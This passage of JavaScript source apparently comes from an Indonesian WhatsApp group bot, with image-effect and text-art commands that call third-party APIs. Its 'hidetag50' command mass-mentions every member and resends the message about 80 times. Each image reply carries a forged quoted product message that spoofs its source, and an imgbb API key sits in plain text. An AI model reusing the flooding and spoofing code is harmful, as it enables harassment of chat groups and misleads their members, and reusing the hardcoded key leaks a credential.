	 Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'smile':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/tosmile?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'skullmask':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/skullmask?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'fisheye':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/fisheye?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deepfry':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/deepfry?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'grayscale':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/grayscale?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'imageflip':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/flip?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pixelate':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/pixelate?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	     
                     case 'maker1':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(8)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/neon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker2':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     const Q = args.join(' ')
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/snowtext?text=${Q}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker3':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     const A = args.join(' ')
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/cloudtext?text=${A}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker4':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(8)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dluxury?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker5':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(8)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dgradient?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker6':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(8)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/blackpink?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker7':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(8)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/realisticvintage?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker8':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(8)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/realisticcloud?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker9':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(8)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/cloudsky?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker10':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/sandsummerbeach?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'kicktime':
			if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, mengeluarkan :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						 Angga.groupRemove(from, mentioned)
					} else {
						setTimeout( () => {
						mentions(`otw kick bosku, kita kasi waktu dulu siap bro? : @${mentioned[0].split('@')[0]}`, mentioned, true)
						}, 0) // 100 = 5s,
					setTimeout( () => {
					 Angga.groupRemove(from, mentioned, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_selamat tinggal Titip gorengan Ya jangan Balik Lagi...._', text) // ur cods
					}, 20000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_ucapkan selamat tinggal mmwaah muwwah..._', text) // ur cods
					}, 10000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_ciiee calon bakalan dikick..._', text) // ur cods
					}, 1000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_siap siap ya bot Kick nih_', text, { quoted: mek }) // ur cods
					}, 0) // 1000 = 10s,
					}
					break
                     case 'imut':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
						fs.unlinkSync(ran)
					})
				break
                     case 'maker11':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/sandwriting?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker12':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/sandengraved?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker13':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/summerysandwriting?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker14':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/balloontext?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker15':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dglue?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker16':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/balloontext?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker17':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/metaldarkgold?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker19':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/1917?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker20':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/minion3d?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker21':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/holographic3d?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker22':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/metalpurpledual?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker23':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/deluxesilver?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker24':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/glossybluemetal?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker25':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/deluxegold?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker26':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/glossycarbon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker27':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/fabric?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker28':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/stone?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker29':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3davengers?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker30':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/marvelstudios?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga1})
                     break
                     case 'maker31':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/marvel?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'hidetag50':
					if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
					
					if (!isGroup) return reply(mess.only.group)
					var value = body.slice(10)
					var group = await Angga.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					Angga.sendMessage(from, options, text)
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
